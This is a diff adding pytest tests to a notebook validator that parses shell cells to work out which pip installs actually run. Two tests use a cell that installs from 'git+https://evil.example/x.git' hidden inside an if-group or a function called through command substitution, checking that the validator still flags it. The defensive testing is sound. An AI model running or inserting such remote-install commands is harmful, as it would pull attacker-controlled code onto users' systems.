@@ -5099,3 +5099,108 @@ def test_a_marker_false_reinstall_does_not_put_a_package_back():
     # A marker the interpreter does satisfy still puts it back.
     applies = "!pip uninstall -y tokenizers\n!pip install \"tokenizers; python_version >= '3.10'\""
     assert nv._removed_by_cell(applies, "tokenizers", nv._marker_environment(colab)) is False
+
+
+def test_a_project_name_is_canonicalized_the_way_pep_503_says():
+    """Any run of `-`, `_` or `.` is one separator to pip.
+
+    Folding only underscores let `pip uninstall huggingface.hub` leave the hyphenated
+    snapshot entry in place, and the rules judged a version the cell had removed.
+    """
+    nv = _load_notebook_validator_module()
+
+    colab = {"huggingface-hub": "1.2.0", "torch": "2.11.0", "python": "3.13.15"}
+    for spelling in ("huggingface.hub", "huggingface_hub", "Huggingface--Hub"):
+        assert "huggingface-hub" not in nv.resolved_set(f"!pip uninstall -y {spelling}", colab)
+        assert nv._removed_by_cell(f"!pip uninstall -y {spelling}", "huggingface-hub") is True
+
+
+def test_a_for_list_is_read_across_any_shell_whitespace():
+    """`for x\tin\ta` is the same loop to bash as the spaced form.
+
+    Partitioning on the literal `" in "` found no list, so a body that certainly runs was
+    marked conditional and its install dropped out of the replay.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert ("!pip install torch==2.11", False) in nv._split_chained(
+        "!for x\tin\ta; do pip install torch==2.11; done"
+    )
+    # A list that may expand to nothing still leaves the body conditional.
+    assert ("!pip install torch==2.11", True) in nv._split_chained(
+        "!for x\tin\t$LIST; do pip install torch==2.11; done"
+    )
+
+
+def test_a_group_behind_a_keyword_is_still_unwrapped():
+    """`if (pip install ...); then` exposes the `(` only once `if` comes off.
+
+    Leaving the bracket in front of the command hid it from PIP_LINE_RE, so a prohibited
+    source in a branch bash reaches went unreported by R-INST-001.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!if (pip install git+https://evil.example/x.git); then :; fi"
+    # The test of an `if` runs whenever the line does, so it is not conditional.
+    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
+    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
+        ["git+https://evil.example/x.git"]
+    ]
+    # A brace group behind a body keyword too, and IPython's `{sys.executable}` still is not one.
+    assert ("!pip install a", True) in nv._split_chained("!if maybe; then { pip install a; }; fi")
+
+
+def test_a_closed_subshell_keeps_the_failure_it_folded():
+    """`(false && true)` exits 1, so bash never reaches the `&&` behind it.
+
+    The close had already folded the group's status, and re-reading the text in hand picked
+    up its last lexical `true` and replayed an install that cannot run.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert ("!pip install torch==2.11.0", True) in nv._split_chained(
+        "!(false && true) && pip install torch==2.11.0"
+    )
+    # A group that really succeeds still carries its tail.
+    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
+        "!(false || true) && pip install torch==2.11.0"
+    )
+    # And a known failure still reaches the `||` fallback.
+    assert ("!pip install torch==2.11.0", False) in nv._split_chained(
+        "!(false && true) || pip install torch==2.11.0"
+    )
+
+
+def test_break_and_continue_take_the_level_they_name():
+    """`break 2` leaves the enclosing loop as well, so the outer body stops too.
+
+    Binding every jump to the innermost loop let the outer loop's remaining commands replay
+    as reached, and a pin bash never installs raised a compatibility finding.
+    """
+    nv = _load_notebook_validator_module()
+
+    outer = "!for x in a; do for y in b; do %s; done; pip install torch==2.11; done"
+    assert ("!pip install torch==2.11", False) in nv._split_chained(outer % "break")
+    for jump in ("break 2", "continue 2", "break 9"):
+        assert "!pip install torch==2.11" not in [
+            text for text, _ in nv._split_chained(outer % jump)
+        ], jump
+
+
+def test_a_substitution_reaches_a_function_its_parent_defined():
+    """A command substitution runs with the functions the parent shell already has.
+
+    The recursive parse cannot see the definition, so an uncalled-looking body was dropped
+    while bash ran the install inside it.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!f(){ pip install git+https://evil.example/x.git; }; echo $(f)"
+    assert ("!pip install git+https://evil.example/x.git", False) in nv._split_chained(cell)
+    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [
+        ["git+https://evil.example/x.git"]
+    ]
+    # A substitution the notebook may not expand leaves the body conditional.
+    assert ("!pip install a", True) in nv._split_chained(
+        "!f(){ pip install a; }; echo ${READY:-$(f)}"
+    )
